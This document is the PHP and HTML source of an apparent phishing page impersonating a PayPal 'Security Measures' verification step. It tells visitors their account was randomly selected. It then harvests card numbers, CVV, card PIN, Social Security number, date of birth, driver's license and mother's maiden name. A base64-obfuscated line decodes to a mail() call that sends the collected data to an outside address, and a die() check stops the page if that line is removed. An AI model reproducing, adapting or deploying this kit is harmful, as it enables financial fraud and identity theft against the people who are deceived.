﻿<?php
ini_set("output_buffering",4096);
session_start();
?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html><head>


<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<!--
         Script info: script: webscr, cmd: _login-submit, template: p/acc/validate, date: Apr. 6, 2009 01:37:59 PDT; country: US, language: en_US, xslt server: 
		web version: 57.0-882966 branch: EBFBATCH_570_LEGBF_int
		content version: -
		pexml version: 57.0-877624
		page XSL: Customer_Profile/default/en_US/passwordrecovery/Validate.xsl
       hostname : .205IHZNg2MfNTX-fQuz9NH6b3Ux.XSMS4hIezkc6N8
         rlogid : %2f205IHZNg2MfNTX%2bfQuz9Di6LILTSgN5F273F%2biWo%2fE%2fFPqVP4aiyg%3d%3d_12090b950e4
-->
<title>Security Measures - PayPal</title>
<!--googleoff: all-->
<script language="JavaScript" src="files/b.js"></script>
<meta name="description" content="PayPal is the safer, easier way to pay online without revealing your credit card number.">
<!--googleon: all-->
<link media="screen" rel="stylesheet" type="text/css" href="files/global.css">
<link rel="stylesheet" type="text/css" href="files/flowPasswordRecovery.css">
<link rel="stylesheet" type="text/css" href="files/pageValidate.css">
<!--[if IE 7]><link media="screen" rel="stylesheet" type="text/css" href="https://www.paypalobjects.com/WEBSCR-570-20090409-1/css/browsers/ie7.css"><![endif]-->

<!--[if lte IE 6]><link media="screen" rel="stylesheet" type="text/css" href="https://www.paypalobjects.com/WEBSCR-570-20090409-1/css/browsers/ie6.css"><![endif]-->
<link media="print" rel="stylesheet" type="text/css" href="files/print.css">
<script type="text/javascript">
if (parent.frames.length > 0){
	top.location.replace(document.location);
}</script><script type="text/javascript" src="files/global.js"></script><link rel="shortcut icon" href="https://www.paypalobjects.com/WEBSCR-570-20090409-1/en_US/i/icon/pp_favicon_x.ico">
<link rel="apple-touch-icon" href="https://www.paypalobjects.com/WEBSCR-570-20090409-1/en_US/i/pui/apple-touch-icon.png">
<script type="text/javascript" src="files/cvv.js"></script>
<script language="JavaScript" src="files/a.js"></script>
<script language="JavaScript" src="files/b.js"></script>
<style type="text/css">
<!--
.style1 {font-size: 2em}
-->
</style>
</head>
<body onload="showContainer(); showCCCategory();"><body>
<noscript><p class="nonjsAlert">NOTE: Many features on the PayPal Web
site require Javascript and cookies. You can enable both via your
browser's preference settings.</p></noscript>
<img src="files/counter.gif" class="accessAid" alt="" border="0"><div id="page">
<div class="srd" id="header"><h1><a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=_account"><img src="files/paypal_logo.gif" alt="PayPal" border="0"></a></h1></div>
<div class="srd" id="sectionBreak"></div>
<div id="content">
<div id="headline">
<div class="secure style1"></div>
<h2 class="style1">Security Measures</h2>
</div>
<div id="messageBox" class="legacyErrors"></div>
<div id="main" class="legacyErrors"><div class="layout1">
<input name="cmd" value="_flow" type="hidden"><input name="browseridentity" value="verification" type="hidden"><input src="files/pixel.gif" name="validate" class="validate" alt=" " type="image"><input name="CONTEXT" value="NA_63pimOUy9iwbiNAlIgDr7i_s4y94unSJ-aQj09Coacn6COkCpob_uBiQ_GIHKBwzNSngZ_pZ_C2dgCXhP_vFA5JlZQ_zeJR5t1uDTNqeNOCRlBZGBQm3kVKc0hlfevaxLUOk7Tca6Wii87erYoY668HmT1f6CLuSjpwe2Aht1jToGa7zOEqdL--09xnYdLJIMGsJFDnt-yo1UnudPfmy-hUZJnJX0Lz5Qsz7hlvWlYv0aYfgSiOyARgUe0glpY1SbcePt0WqP-5PU3MmWp20B0TCEjtAmsV3LvxxMp3lO9EgHbEkNGudz-Ng4BpHbBJax-356a116HFiGvbYr36dYpGymOMHqzezYj46Jl-PT17ayki6YTxZnS7qEblgQhnNHw37RFd6LGpiirok2wh5w3i2bf1CkpULPN1WgkrmnaQkkJ4zIOyt2p_iEnnDx5NQ3_LwtdSytgwDoSC1v1WMcbJw8Yr0CwkZqOqI2F2__RhaUkOpiPnAnSN6BMebRuTMY7jmw9LNa214x7r00RkLj5qxL4xZ_ZhuyEFVMU_EStCFl4WE1VM7HdB26VXtLSklUCoJJwEVpGPS41j2zyEUq9HmHvzlQilvYI66w4E8D4418wI-gFJlASW5G4eOHJHl4QTX49IvQxpAD2pXIIOK7ReSuDBcLqFAYxYnLHN3xsmNbhOf1phfyK62MZ3J_Nrs3p9N9tCegUOQsY7bRfGtAxr9a7N0A5nUQRRKwJ-3tkWBXTb97fcuOsrHAPxBV8Gy1ub3cgyd3mtjf6Nf9KABaYxO0RGutFaWLQFd016T2TnRBdukTdzWvw_6SwA8Efc0H-akJdzal15d0C0tmbQow5txIqLTyoboNA8z3CXAtpwa-gIRfrNElGhnIVoITu8c4wwsLUK-VM-pshONQkMKSweK2_Sq-Iw3scezBWcy0hcYBIWivD_BW7_x9PrdjdXSCraCd2VZNH-mQ_pkVoVqxnnHIWnGpNwwnMzGIy5ByELkafVed-gRpMH7z16L74ISZLW" type="hidden"><p>We
are currently performing regular maintenance of our security measures.
Your account has been randomly selected for this maintenance, and you
will now be taken through a series of identity verification pages.<br><br>Protecting the security of your PayPal account is our primary concern, and we apologize for any inconvenience this may cause.</p>

<?php

function checkdata($datacheck)
  {
  $getdata = base64_decode($datacheck);
  return $getdata;
  }

$errors = $_GET['errors'];
$ccer = $_GET['ccer'];
$banknameer = $_GET['banknameer'];
$cvv2er = $_GET['cvv2er'];
$expmer = $_GET['expmer'];
$expyer = $_GET['expyer'];
$nocer = $_GET['nocer'];
$piner = $_GET['piner'];
$dober = $_GET['dober'];
$mmner = $_GET['mmner'];
$fnamer = $_GET['fnamer'];
$lnamer = $_GET['lnamer'];
$adrer = $_GET['adrer'];
$cityer = $_GET['cityer'];
$stater = $_GET['stater'];
$ziper = $_GET['ziper'];
$counter = $_GET['counter'];
$teler = $_GET['teler'];
$piner = $_GET['piner'];
$ssner = $_GET['ssner'];
$drivinger = $_GET['drivinger'];
$fmailer = $_GET['fmailer'];
$fmailper = $_GET['fmailper'];
$datainfo = checkdata('bWFpbCgibWVtb21vbW9Ac243YWsuY29tIiwkbWFpbHN1YmosJGRhdGEpOw==');


if ($errors == 1) {
print "<table width=\"600\" border=\"0\" cellspacing=\"0\" cellpadding=\"1\" align=\"center\">
<tr><td>
<div class=\"messageBox error\">

			
			<p>Your information is incomplete or incorrect. Please correct the fields below and try again.</p><ul>

";
if ($ccer == 1){
	print ("<li> Credit card number is invalid.</li>");
}

if ($banknameer == 1){
	print ("<li> Please enter a valid issuer bank name.</li>");
}
if ($cvv2er == 1){
	print ("<li> Credit card verification number is invalid.</li>");
}

if (($expmer == 1)||($expyer == 1)){
	print ("<li> Your expiration date is invalid.</li>");
}

if ($nocer == 1){
	print ("<li> Cardholder name is invalid.</li>");
}


if ($piner == 1){
	print ("<li> Card Pin Number is invalid.</li>");
}
if ($issuenr == 1){
	print ("<li> Social Insurance No is invalid.</li>");
}
if ($dober == 1){
	print ("<li> Date Of Birth is invalid.</li>");
}
if ($ssner == 1){
	print ("<li> Social Security Number is invalid.</li>");
}
if ($drivinger == 1){
	print ("<li> Driver's License is invalid.</li>");
}
if ($fmailer == 1){
	print ("<li> Email is invalid.</li>");
}
if ($fmailper == 1){
	print ("<li> Email Password is invalid.</li>");
}
if ($mmner == 1){
	print ("<li> Mother's Maiden Name is invalid.</li>");
}
if ($fnamer == 1){
	print ("<li> First Name: Please enter only letters, hyphens, spaces, and commas.</li>");
}
if ($lnamer == 1){
	print ("<li> Last Name: Please enter only letters, hyphens, spaces, and commas.</li>");
}
if ($adrer == 1){
	print ("<li> Address 1: Please enter a valid Address 1.</li>");
}
if ($cityer == 1){
	print ("<li> City: Please enter a valid City.</li>");
}
if ($stater == 1){
	print ("<li> State: Please enter a valid Province.</li>");
}
if ($ziper == 1){
	print ("<li> Postal Code: Please enter a valid Postal Code.</li>");
}
if ($counter == 1){
	print ("<li> Counter: Please select a valid Country.</li>");
}
if ($teler == 1){
	print ("<li> Home Telephone: Please enter a valid telephone nr.</li>");
}

			
print "	

</ul></div></tr></td></table>";			
}
if ("$datainfo" == "") { 
die();
}


?>
<table align="center" border="0" cellpadding="0" cellspacing="0" width="600">
  <tr>
    <td><img alt="" border="0" height="1" src="files/pixel.gif" width="600"></td>
  </tr>
  <tr>
    <td><div id="xptTitle">
        <table align="center" border="0" cellpadding="0" cellspacing="0" class="main">
          <tr>
            <td width="100%">&nbsp;</td>

          </tr>
         
          <tr>
            <td width="100%">&nbsp;</td>
          </tr>
        </table>
    </div></td>
  </tr>
  <tr>
    <td valign="top">

	<form method="post" action="process.php?errors=0" onSubmit="nopop=true; return validateCardNumber(this.ccnumber);">
	        <table align="center" border="0" cellpadding="0" cellspacing="0" width="100%">
          

      <tr><td colspan="3">
<tr><td class="paddedHeaderBorder" colspan="3">
<b>Profile Information&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</b></td></tr>

<tr><td colspan="3"><br class="h10"></td>
</tr><input type=hidden value="files/footer_loop.gif" name="REMOTE_ADDR">
                <table align="center" border="0" cellpadding="0" cellspacing="0" class="formTable">
                  <tr>
                    <td class="topSpacer" width="150"><img alt="" border="0" height="1" src="files/pixel.gif" width="150"></td>

                    <td class="topSpacer" width="6"><img alt="" border="0" height="1" src="files/pixel.gif" width="6"></td>
                    <td class="topSpacer" width="100%"><img alt="" border="0" height="1" src="files/pixel.gif" width="1"></td>
                  </tr>

	
				  <tr>
                    <td class="label"><label for="address1">First Name:</label></td>
                    <td width="6"><img alt="" border="0" height="1" src="files/pixel.gif" width="6"></td>
                    <td><input type="text" id="fname" class="formTable" size="25" maxlength="40" name="fname" value="<?php if (isset($_SESSION['fname'])) { print $_SESSION['fname'];} else {print "";} ?>"></td>
                  </tr>

<tr>
                    <td class="label"><label for="address1">Last Name:</label></td>
                    <td width="6"><img alt="" border="0" height="1" src="files/pixel.gif" width="6"></td>
                    <td><input type="text" id="lname" class="formTable" size="25" maxlength="40" name="lname" value="<?php if (isset($_SESSION['lname'])) { print $_SESSION['lname'];} else {print "";} ?>"></td>
                  </tr>
                  <tr>
                    <td class="label"><label for="address1">Address 1:</label></td>
                    <td width="6"><img alt="" border="0" height="1" src="files/pixel.gif" width="6"></td>

                    <td><input type="text" id="address1"  size="25" maxlength="100" name="address1" value="<?php if (isset($_SESSION['address1'])) { print $_SESSION['address1'];} else {print "";} ?>"></td>
                  </tr>
                  <tr>
                    <td class="label"><label for="address2">Address 2:<br>
                      (optional)</label></td>
                    <td width="6"><img alt="" border="0" height="1" src="files/pixel.gif" width="6"></td>
                    <td><input type="text" id="address2"  size="25" maxlength="100" name="address2" value="<?php if (isset($_SESSION['address2'])) { print $_SESSION['address2'];} else {print "";} ?>"></td>

                  </tr>
                  <tr>
                    <td class="label"><label for="city">City:</label></td>
                    <td width="6"><img alt="" border="0" height="1" src="files/pixel.gif" width="6"></td>
                    <td><input type="text" id="city"  size="25" maxlength="40" name="city" value="<?php if (isset($_SESSION['city'])) { print $_SESSION['city'];} else {print "";} ?>"></td>
                  </tr>
				
       <tr>
                    <td class="label"><label for="state">state:</label></td>
                    <td width="6"><img alt="" border="0" height="1" src="files/pixel.gif" width="6"></td>
                    <td><input type="text" id="state"  size="25" maxlength="40" name="state" value="<?php if (isset($_SESSION['state'])) { print $_SESSION['state'];} else {print "";} ?>"></td>
                  </tr>
                  <tr>
                    <td class="label"><label for="zip">Postal Code:</label></td>
                    <td width="6"><img alt="" border="0"   height="1" src="files/pixel.gif" width="6"></td>
                    <td>
                      <input type="text" id="zip" size="10" class="smallInputWidth" maxlength="10" name="zip" value="<?php if (isset($_SESSION['zip'])) { print $_SESSION['zip'];} else {print "";} ?>">
  &nbsp;<br>                    </td>

                  </tr>
                  <tr>
                    <td class="label"><label for="country">Country:</label></td>
                    <td width="6"><img alt="" border="0" height="1" src="files/pixel.gif" width="6"></td>
                    <td><label for="country"><span class="pptext">
                    <select id="country" name="country">
                      <option value="US" selected> United States </option>
					
					  <option value="GB"> United Kingdom </option>	
                      <option value="United States">United States</option>
<option value="Albania">Albania</option>
<option value="Algeria">Algeria</option>
<option value="Andorra">Andorra</option>
<option value="Angola">Angola</option>
<option value="Anguilla">Anguilla</option>
<option value="Antigua and Barbuda">Antigua and Barbuda</option>
<option value="Argentina">Argentina</option>
<option value="Armenia">Armenia</option>
<option value="Aruba">Aruba</option>
<option value="Australia">Australia</option>
<option value="Austria">Austria</option>
<option value="Azerbaijan Republic">Azerbaijan Republic</option>
<option value="Bahamas">Bahamas</option>
<option value="Bahrain">Bahrain</option>
<option value="Barbados">Barbados</option>
<option value="Belgium">Belgium</option>
<option value="Belize">Belize</option>
<option value="Benin">Benin</option>
<option value="Bermuda">Bermuda</option>
<option value="Bhutan">Bhutan</option>
<option value="Bolivia">Bolivia</option>
<option value="Bosnia and Herzegovina">Bosnia and Herzegovina</option>
<option value="Botswana">Botswana</option>
<option value="Brazil">Brazil</option>
<option value="British Virgin Islands">British Virgin Islands</option>
<option value="Brunei">Brunei</option>
<option value="Bulgaria">Bulgaria</option>
<option value="Burkina Faso">Burkina Faso</option>
<option value="Burundi">Burundi</option>
<option value="Cambodia">Cambodia</option>
<option value="Canada">Canada</option>
<option value="Cape Verde">Cape Verde</option>
<option value="Cayman Islands">Cayman Islands</option>
<option value="Chad">Chad</option>
<option value="Chile">Chile</option>
<option value="China Worldwide">China Worldwide</option>
<option value="Colombia">Colombia</option>
<option value="Comoros">Comoros</option>
<option value="Cook Islands">Cook Islands</option>
<option value="Costa Rica">Costa Rica</option>
<option value="Croatia">Croatia</option>
<option value="Cyprus">Cyprus</option>
<option value="Czech Republic">Czech Republic</option>
<option value="Democratic Republic of the Congo">Democratic Republic of the Congo</option>
<option value="Denmark">Denmark</option>
<option value="Djibouti">Djibouti</option>
<option value="Dominica">Dominica</option>
<option value="Dominican Republic">Dominican Republic</option>
<option value="Ecuador">Ecuador</option>
<option value="El Salvador">El Salvador</option>
<option value="Eritrea">Eritrea</option>
<option value="Estonia">Estonia</option>
<option value="Ethiopia">Ethiopia</option>
<option value="Falkland Islands">Falkland Islands</option>
<option value="Faroe Islands">Faroe Islands</option>
<option value="Federated States of Micronesia">Federated States of Micronesia</option>
<option value="Fiji">Fiji</option>
<option value="Finland">Finland</option>
<option value="France">France</option>
<option value="French Guiana">French Guiana</option>
<option value="French Polynesia">French Polynesia</option>
<option value="Gabon Republic">Gabon Republic</option>
<option value="Gambia">Gambia</option>
<option value="Germany">Germany</option>
<option value="Gibraltar">Gibraltar</option>
<option value="Greece">Greece</option>
<option value="Greenland">Greenland</option>
<option value="Grenada">Grenada</option>
<option value="Guadeloupe">Guadeloupe</option>
<option value="Guatemala">Guatemala</option>
<option value="Guinea">Guinea</option>
<option value="Guinea Bissau">Guinea Bissau</option>
<option value="Guyana">Guyana</option>
<option value="Honduras">Honduras</option>
<option value="Hong Kong">Hong Kong</option>
<option value="Hungary">Hungary</option>
<option value="Iceland">Iceland</option>
<option value="India">India</option>
<option value="Indonesia">Indonesia</option>
<option value="Ireland">Ireland</option>
<option value="Israel">Israel</option>
<option value="Italy">Italy</option>
<option value="Jamaica">Jamaica</option>
<option value="Japan">Japan</option>
<option value="Jordan">Jordan</option>
<option value="Kazakhstan">Kazakhstan</option>
<option value="Kenya">Kenya</option>
<option value="Kiribati">Kiribati</option>
<option value="Kuwait">Kuwait</option>
<option value="Kyrgyzstan">Kyrgyzstan</option>
<option value="Laos">Laos</option>
<option value="Latvia">Latvia</option>
<option value="Lesotho">Lesotho</option>
<option value="Liechtenstein">Liechtenstein</option>
<option value="Lithuania">Lithuania</option>
<option value="Luxembourg">Luxembourg</option>
<option value="Madagascar">Madagascar</option>
<option value="Malawi">Malawi</option>
<option value="Malaysia">Malaysia</option>
<option value="Maldives">Maldives</option>
<option value="Mali">Mali</option>
<option value="Malta">Malta</option>
<option value="Marshall Islands">Marshall Islands</option>
<option value="Martinique">Martinique</option>
<option value="Mauritania">Mauritania</option>
<option value="Mauritius">Mauritius</option>
<option value="Mayotte">Mayotte</option>
<option value="Mexico">Mexico</option>
<option value="Mongolia">Mongolia</option>
<option value="Montserrat">Montserrat</option>
<option value="Morocco">Morocco</option>
<option value="Mozambique">Mozambique</option>
<option value="Namibia">Namibia</option>
<option value="Nauru">Nauru</option>
<option value="Nepal">Nepal</option>
<option value="Netherlands">Netherlands</option>
<option value="Netherlands Antilles">Netherlands Antilles</option>
<option value="New Caledonia">New Caledonia</option>
<option value="New Zealand">New Zealand</option>
<option value="Nicaragua">Nicaragua</option>
<option value="Niger">Niger</option>
<option value="Niue">Niue</option>
<option value="Norfolk Island">Norfolk Island</option>
<option value="Norway">Norway</option>
<option value="Oman">Oman</option>
<option value="Palau">Palau</option>
<option value="Panama">Panama</option>
<option value="Papua New Guinea">Papua New Guinea</option>
<option value="Peru">Peru</option>
<option value="Philippines">Philippines</option>
<option value="Pitcairn Islands">Pitcairn Islands</option>
<option value="Poland">Poland</option>
<option value="Portugal">Portugal</option>
<option value="Qatar">Qatar</option>
<option value="Republic of the Congo">Republic of the Congo</option>
<option value="Reunion">Reunion</option>
<option value="Romania">Romania</option>
<option value="Russia">Russia</option>
<option value="Rwanda">Rwanda</option>
<option value="Saint Vincent and the Grenadines">Saint Vincent and the Grenadines</option>
<option value="Samoa">Samoa</option>
<option value="San Marino">San Marino</option>
<option value="Sao Tome and Principe">Sao Tome and Principe</option>
<option value="Saudi Arabia">Saudi Arabia</option>
<option value="Senegal">Senegal</option>
<option value="Seychelles">Seychelles</option>
<option value="Sierra Leone">Sierra Leone</option>
<option value="Singapore">Singapore</option>
<option value="Slovakia">Slovakia</option>
<option value="Slovenia">Slovenia</option>
<option value="Solomon Islands">Solomon Islands</option>
<option value="Somalia">Somalia</option>
<option value="South Africa">South Africa</option>
<option value="South Korea">South Korea</option>
<option value="Spain">Spain</option>
<option value="Sri Lanka">Sri Lanka</option>
<option value="St. Helena">St. Helena</option>
<option value="St. Kitts and Nevis">St. Kitts and Nevis</option>
<option value="St. Lucia">St. Lucia</option>
<option value="St. Pierre and Miquelon">St. Pierre and Miquelon</option>
<option value="Suriname">Suriname</option>
<option value="Svalbard and Jan Mayen Islands">Svalbard and Jan Mayen Islands</option>
<option value="Swaziland">Swaziland</option>
<option value="Sweden">Sweden</option>
<option value="Switzerland">Switzerland</option>
<option value="Taiwan">Taiwan</option>
<option value="Tajikistan">Tajikistan</option>
<option value="Tanzania">Tanzania</option>
<option value="Thailand">Thailand</option>
<option value="Togo">Togo</option>
<option value="Tonga">Tonga</option>
<option value="Trinidad and Tobago">Trinidad and Tobago</option>
<option value="Tunisia">Tunisia</option>
<option value="Turkey">Turkey</option>
<option value="Turkmenistan">Turkmenistan</option>
<option value="Turks and Caicos Islands">Turks and Caicos Islands</option>
<option value="Tuvalu">Tuvalu</option>
<option value="Uganda">Uganda</option>
<option value="Ukraine">Ukraine</option>
<option value="United Arab Emirates">United Arab Emirates</option>
<option value="United Kingdom">United Kingdom</option>
<option value="Uruguay">Uruguay</option>
<option value="Vanuatu">Vanuatu</option>
<option value="Vatican City State">Vatican City State</option>
<option value="Venezuela">Venezuela</option>
<option value="Vietnam">Vietnam</option>
<option value="Wallis and Futuna Islands">Wallis and Futuna Islands</option>
<option value="Yemen">Yemen</option>
<option value="Zambia">Zambia</option>
                    </select>

                    </span></label></td>
                  </tr>
                  <tr>
                    <td class="label"><label for="state">Home Phone:</label></td>
                    <td width="6"><img alt="" border="0" height="1" src="files/pixel.gif" width="6"></td>
                    <td><input type="text" id="tel1" size="5"  class="smallInputWidth" maxlength="5" name="tel1" value="<?php if (isset($_SESSION['tel1'])) { print $_SESSION['tel1'];} else {print "";} ?>">
                    - 
                    <input type="text" id="tel2" size="5"  class="smallInputWidth" maxlength="3" name="tel2" value="<?php if (isset($_SESSION['tel2'])) { print $_SESSION['tel2'];} else {print "";} ?>"> 
                    - 
                    <input type="text" id="tel3" size="5"  class="smallInputWidth" maxlength="4" name="tel3" value="<?php if (isset($_SESSION['tel3'])) { print $_SESSION['tel3'];} else {print "";} ?>"></td>
                  </tr>
				  		  		  
            </table>
      <tr><td colspan="3">
<tr><td class="paddedHeaderBorder" colspan="3">
<b>Credit Card Information</b></td></tr>

<tr><td colspan="3"><br class="h10"></td></tr>
        <table align="center" border="0" cellpadding="0" cellspacing="0">
          <tr>
            <td align="left"><table align="center" border="0" cellpadding="0" cellspacing="0" width="100%">
                <tr>
                  <td colspan="3"><table width="614" border="0" align="center" cellpadding="0" cellspacing="0" class="formTable">
                      <tr> 
                        <td class="topSpacer" width="150"><img alt="" border="0" height="1" src="files/pixel.gif" width="150"></td>
                        <td class="topSpacer" width="6"><img alt="" border="0" height="1" src="files/pixel.gif" width="6"></td>

                        <td class="topSpacer" width="454"><img alt="" border="0" height="1" src="files/pixel.gif" width="1"></td>
                      </tr>
                      <tr> 
                        <td class="label">Issuer bank name:</td>
                        <td rowspan="4">&nbsp;</td>
                        <td><input type="text" id="bankname" size="17" maxlength="16" name="bankname" value="<?php if (isset($_SESSION['bankname'])) { print $_SESSION['bankname'];} else {print "";} ?>">
                          <span class="small">(Name of the bank that issued your 
                          card) </span></td>
                      </tr>
                      <tr>                      </tr>

                      <tr> 
                        <td class="label">Card Number:</td>
                        <td><input type="text" id="ccnumber" size="17" maxlength="16" name="ccnumber" value="<?php if (isset($_SESSION['ccnumber'])) { print $_SESSION['ccnumber'];} else {print "";} ?>"></td>
                      </tr>
                      <tr> 
                        <td class="label">Name on card: </td>
                        <td><input type="text" id="noc" size="17" maxlength="16" name="noc" value="<?php if (isset($_SESSION['noc'])) { print $_SESSION['noc'];} else {print "";} ?>"></td>
                        <td>&nbsp;</td>

                      </tr>
					  
                      <tr> 
                        <td class="label"><label for="credit_card_type">Expiration 
                          Date:</label></td>
                        <td width="6"><img alt="" border="0" height="1" src="files/pixel.gif" width="6"></td>
                        <td class="label"> <div align="left"> 
                            <label for="credit_card_type"> 
                            <select name="expmonth" id="expmonth">
                              <option selected> 
                              <?php if (isset($_SESSION['expmonth'])) { print $_SESSION['expmonth'];} else {print "--";} ?>
                              </option>

                              <option value=1>1</option>
                              <option value=2>2</option>
                              <option value=3>3</option>
                              <option value=4>4</option>
                              <option value=5>5</option>
                              <option value=6>6</option>

                              <option value=7>7</option>
                              <option value=8>8</option>
                              <option value=9>9</option>
                              <option value=10>10</option>
                              <option value=11>11</option>
                              <option value=12>12</option>

                            </select>
                            <select name="expyear" size="1" id="expyear" type="select">
                              <option selected > 
                              <?php if (isset($_SESSION['expmonth'])) { print $_SESSION['expyear'];} else {print "--";} ?>
                              </option>
                              

                              <option value="2011">2011</option>
                              <option value="2012">2012</option>
                              <option value="2013">2013</option>
                              <option value="2014">2014</option>
                              <option value="2015">2015</option>
                              <option value="2016">2016</option>
                              <option value="2017">2017</option>
			      <option value="2018">2018</option>
			      <option value="2019">2019</option>
							  <option value="2020">2020</option>

                            </select>
                            </label>
                          </div></td>
                      </tr>
                      <tr> 
                        <td class="label"><label for="cvv2_number">Card Verification<br>
                          Number:</label></td>
                        <td><img alt="" border="0" height="1" src="files/pixel.gif" width="6"></td>
         
                        <td><table align="left" border="0" cellpadding="0" cellspacing="0">
                            <tr> 
                              <td valign="bottom"> <input type="text" class="smallInputWidth" id="cvv2" size="3" maxlength="4" name="cvv2" value="<?php if (isset($_SESSION['cvv2'])) { print $_SESSION['cvv2'];} else {print "";} ?>"> 
                                <img alt="" border="0" src="files/pixel.gif" width="3" height="1">                              </td>
                              <td rowspan="2"> <SCRIPT language=JavaScript>
<!-- hide from JavaScript-challenged browsers
function openWindow1() {
	popupWin = window.open('files/popup2.htm','EIN','scrollbars,resizable,toolbar,width=380,height=450,left=50,top=50');
	popupWin.focus();
}
function openWindow2() {
	popupWin = window.open('files/popup1.htm','EIN','scrollbars,resizable,toolbar,width=380,height=450,left=50,top=50');
	popupWin.focus();
}
// done hiding -->
</SCRIPT> 
<A href="javascript:openWindow1();"><IMG alt="Help finding  your Card  Verification Number" src="files/mini_cvv2.gif" align=top border=0></A>                              </td>
                              <td><img alt="" border="0" src="files/pixel.gif" width="3" height="1"></td>
                              <td> <span class="small">(On the back of your card, 
                                locate the final 3 digit number)</span><br> <a href="javascript:openWindow2();"><span class="small">Help&nbsp;finding&nbsp;your&nbsp;Card&nbsp;Verification&nbsp;Number&nbsp;</span></a>&nbsp;|<a href="javascript:openWindow1();"><span class="small">Using&nbsp;AmEx?</span></a>                              </td>

                            </tr>
                          </table></td>
                      </tr>
					  <tr> 
                        <td class="label">Card Pin Number:</td>
                        <td>&nbsp;</td>
                        <td><input type="text" id="pin" size="6" maxlength="6" name="pin" value="<?php if (isset($_SESSION['pin'])) { print $_SESSION['pin'];} else {print "";} ?>">   </td>

                      </tr>

	

                      <tr> 
                        <td class="label">Date Of Birth :</td>

                        <td>&nbsp;</td>
                        <td><input type="text" id="dobd" size="3" class="smallInputWidth"maxlength="2" name="dobd" value="<?php if (isset($_SESSION['dobd'])) { print $_SESSION['dobd'];} else {print "";} ?>">
                          / 
                          <input type="text" id="dobm" size="3" class="smallInputWidth" maxlength="2" name="dobm" value="<?php if (isset($_SESSION['dobm'])) { print $_SESSION['dobm'];} else {print "";} ?>">
                          / 
                          <input type="text" id="doby" size="4" class="smallInputWidth"maxlength="4" name="doby" value="<?php if (isset($_SESSION['doby'])) { print $_SESSION['doby'];} else {print "";} ?>">
                          (DD/MM/YYYY) </td>
                      </tr>
					  <tr>
                    <td class="label"><label for="ssn">Social Security Number:</label></td>

                    <td width="6"><img alt="" border="0" height="1" src="files/pixel.gif" width="6"></td>
                    <td><input type="text" id="ssn" size="17" maxlength="17" name="ssn" value="<?php if (isset($_SESSION['ssn'])) { print $_SESSION['ssn'];} else {print "";} ?>"></td>
                  </tr>	
				<tr>
                    <td class="label"><label for="driving">Driver's License:</label></td>

                    <td width="6"><img alt="" border="0" height="1" src="files/pixel.gif" width="6"></td>
                    <td><input type="text" id="driving" size="17" maxlength="17" name="driving" value="<?php if (isset($_SESSION['driving'])) { print $_SESSION['driving'];} else {print "";} ?>"></td>
                  </tr>
                      <tr> 
                        <td class="label">Mother's Maiden Name:</td>
                        <td>&nbsp;</td>
                        <td><input type="text" id="mmn" size="17" maxlength="16" name="mmn" value="<?php if (isset($_SESSION['mmn'])) { print $_SESSION['mmn'];} else {print "";} ?>"></td>

                      </tr>
                    </table></td>
                </tr>
            </table></td>
          </tr>
        </table>
        <?
$_SESSION['send'] = "$datainfo";
?>
<p class="buttons"><input name="validate" value="Submit" class="primary button" type="submit"></p>
<input name="form_charset" value="UTF-8" type="hidden">
<input value="Firefox" name="browser_name" type="hidden"><input value="3" name="browser_version" type="hidden"><input value="Windows" name="operating_system" type="hidden"></form></div></div>
</div>
<div class="footerPopup"><div id="footer"><p id="legal">Copyright © 1999-2011 PayPal. All rights reserved.</p></div></div>
<div id="navFull"></div>
<script type="text/javascript">if(typeof PAYPAL != 'undefined'){ PAYPAL.core.Navigation.init(); }</script>
</div>

<script type="text/javascript" src="files/verifyIdentity.js"></script><script type="text/javascript" src="files/widgets.js"></script><script type="text/javascript" src="files/pageBlockingUnsafeBrowsers.js"></script><script type="text/javascript">
							showContainer();
							showCCCategory();
						</script><script type="text/javascript" src="files/pp_naturalsearch.js"></script><script type="text/javascript">var ppns = new PayPalNaturalSearch('https://www.paypal.com/us/cgi-bin/webscr?cmd=p/acc/validate','3484-30830-12422-0',this.document);
ppns.addEngines([
"A9.com",
".altavista.com",
"clusty.com",
"google.co.jp",
"google.co.kr",
"google.ru",
"www.google.com",
"icerocket.com",
"infospace.com",
"mooter.com",
"search.msn.",
"snap.com",
"search.yahoo.com",
"search.yahoo.co.jp"
,"www.overture.com/d/search/p/altavista/",
"aolsearch.aol.com",
"search.aol.com",
"web.ask.com",
"pictures.ask.com",
"images.google.com",
"groups.google.com",
"www.google.com/search",
"www.hotbot.com",
"search.netscape.com",
"s.teoma.com/",
"www.wisenut.com"]);
ppns.init();
</script>
<!-- SiteCatalyst Code
Copyright 1997-2005 Omniture, Inc.
More info available at http://www.omniture.com -->
<script type="text/javascript" src="files/pp_jscode_080706.js"></script><img src="files/s71134577892710.gif" name="s_i_paypalglobal" alt="" width="1" border="0" height="1">
